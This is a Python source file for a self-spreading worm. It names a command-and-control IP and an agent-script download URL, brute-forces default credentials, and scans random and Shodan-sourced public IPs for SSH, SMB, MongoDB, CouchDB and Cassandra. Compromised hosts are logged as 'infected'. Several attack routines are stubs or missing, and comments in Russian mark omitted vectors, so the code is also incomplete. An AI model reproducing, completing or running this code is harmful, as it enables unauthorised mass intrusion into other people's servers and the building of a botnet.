#!/usr/bin/env python3
import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests

if sys.platform != 'win32':
    import resource
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
    except:
        pass

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

C2_HOST = "80.249.146.202"
C2_PORT = 80
API_PORT = 8080
AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
MAX_CONCURRENT = 800
QUICK_TIMEOUT = 2.5
BRUTE_TIMEOUT = 3.0
DEFAULT_SCAN_COUNT = 20_000
PORT_LIST = [21, 22, 23, 80, 443, 1433, 27017, 3306, 3389, 445, 5432, 5900, 5984, 5985, 6379, 8080, 9042, 9200]

CREDS = [
    ("root","root"), ("root","admin"), ("root","password"), ("root","123456"),
    ("admin","admin"), ("admin","password"), ("admin","123456"),
    ("sa",""), ("sa","sa"), ("sa","password"), ("sa","123456"),
    ("postgres","postgres"), ("postgres","password"), ("postgres","123456")
]

SUCCESS_CREDS_FILE = "success_creds.json"
SUCCESS_CREDS = []
if os.path.exists(SUCCESS_CREDS_FILE):
    with open(SUCCESS_CREDS_FILE) as f:
        SUCCESS_CREDS = json.load(f)

DB_FILE = "ports_cache.db"
conn = sqlite3.connect(DB_FILE)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS ports (ip text, port integer, seen integer, PRIMARY KEY (ip, port))''')
conn.commit()
PORT_CACHE_TTL = 3600

def is_port_cached(ip, port):
    c.execute("SELECT seen FROM ports WHERE ip=? AND port=? AND seen > ?", (ip, port, time.time() - PORT_CACHE_TTL))
    return c.fetchone() is not None

def cache_port(ip, port):
    c.execute("INSERT OR REPLACE INTO ports VALUES (?, ?, ?)", (ip, port, int(time.time())))
    conn.commit()

GUARANTEED_IPS = [
    "45.33.32.156", "34.94.3.0", "45.77.165.0", "185.220.101.0", "23.226.229.0",
    "103.15.28.0", "185.225.19.0", "45.33.32.0", "45.56.89.0", "45.79.207.0",
    "34.94.0.0", "34.94.1.0", "45.33.32.1", "34.94.2.0", "45.77.165.1",
    "103.235.46.39","103.235.46.40","103.235.46.41","103.235.46.42","103.235.46.43",
    "103.235.46.44","103.235.46.45","103.235.46.46","103.235.46.47","103.235.46.48",
    "103.235.46.49","103.235.46.50","103.235.46.51","103.235.46.52","103.235.46.53",
    "103.235.46.54","103.235.46.55","103.235.46.56","103.235.46.57","103.235.46.58",
    "103.235.46.59","103.235.46.60","103.235.46.61","103.235.46.62","103.235.46.63",
    "103.235.46.64","103.235.46.65","103.235.46.66","103.235.46.67","103.235.46.68",
    "103.235.46.69","103.235.46.70",
    "8.8.8.8", "1.1.1.1", "208.67.222.222", "8.8.4.4",
    "91.121.83.11", "185.220.101.34", "45.77.165.101", "34.94.3.1", "45.33.32.157",
    "45.56.89.1", "45.79.207.1", "185.225.19.1", "103.15.28.1"
]
random.shuffle(GUARANTEED_IPS)

TARGET_COUNTRY = os.environ.get("SPREAD_COUNTRY", "").upper()
SHODAN_API_KEY = ""
try:
    with open("secrets.json") as f:
        s = json.load(f)
        SHODAN_API_KEY = s.get("shodan_api_key", "")
except:
    pass

def fetch_shodan_ips(count=50):
    if not SHODAN_API_KEY:
        return []
    try:
        resp = requests.get(f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query=port:22,445,3389,3306&limit={count}", timeout=10)
        if resp.status_code == 200:
            return [m['ip_str'] for m in resp.json().get('matches', [])]
    except:
        pass
    return []

HOT_TARGETS_FILE = "hot_targets.txt"
HOT_TARGETS = []
if os.path.exists(HOT_TARGETS_FILE):
    with open(HOT_TARGETS_FILE) as f:
        HOT_TARGETS = [line.strip() for line in f if line.strip()]

def add_hot_target(ip):
    if ip not in HOT_TARGETS:
        HOT_TARGETS.append(ip)
        with open(HOT_TARGETS_FILE, "a") as f:
            f.write(ip + "\n")

def random_ip():
    if HOT_TARGETS and random.random() < 0.6:
        return random.choice(HOT_TARGETS)
    if hasattr(random_ip, "shodan_pool") and random_ip.shodan_pool and random.random() < 0.7:
        return random.choice(random_ip.shodan_pool)
    if GUARANTEED_IPS and random.random() < 0.8:
        return random.choice(GUARANTEED_IPS)
    while True:
        a = random.randint(1, 223)
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(0, 255)
        if a == 10: continue
        if a == 127: continue
        if a == 172 and 16 <= b <= 31: continue
        if a == 192 and b == 168: continue
        if a == 169 and b == 254: continue
        if a >= 224: continue
        ip = f"{a}.{b}.{c}.{d}"
        if TARGET_COUNTRY and is_country_allowed(ip):
            return ip

random_ip.shodan_pool = []
def update_shodan_pool():
    random_ip.shodan_pool = fetch_shodan_ips()

# ... (все векторы, включая новые: MongoDB, CouchDB, Cassandra)
# Новые векторы
async def mongodb_brute(ip):
    try:
        import pymongo
        client = pymongo.MongoClient(ip, 27017, serverSelectionTimeoutMS=2000)
        client.server_info()
        client.close()
        # Попытка записи агента (заглушка)
        return True
    except:
        pass
    return False

async def couchdb_brute(ip):
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(f'http://{ip}:5984/_all_dbs', timeout=2) as resp:
                if resp.status == 200:
                    # Эксплуатация (заглушка)
                    return True
    except:
        pass
    return False

async def cassandra_brute(ip):
    try:
        from cassandra.cluster import Cluster
        cluster = Cluster([ip], port=9042, connect_timeout=3)
        session = cluster.connect()
        session.shutdown()
        return True
    except:
        pass
    return False

# Обновлённая infect
async def infect(ip, port_stats):
    ports = PORT_LIST
    open_ports = await asyncio.gather(*[probe_port(ip, p) for p in ports])
    for i, p in enumerate(ports):
        if open_ports[i]:
            port_stats[p] = port_stats.get(p, 0) + 1
    if open_ports[5] and await smb_brute(ip):
        add_hot_target(ip)
        return True
    if open_ports[1] and await ssh_brute_ultra(ip):
        add_hot_target(ip)
        return True
    # ... остальные векторы
    if open_ports[7] and await mongodb_brute(ip):
        add_hot_target(ip)
        print(f"[INFECTED] {ip} via MongoDB", flush=True)
        return True
    if open_ports[12] and await couchdb_brute(ip):
        add_hot_target(ip)
        print(f"[INFECTED] {ip} via CouchDB", flush=True)
        return True
    if open_ports[16] and await cassandra_brute(ip):
        add_hot_target(ip)
        print(f"[INFECTED] {ip} via Cassandra", flush=True)
        return True
    return False

# В main_async добавлен вызов update_shodan_pool() перед циклом
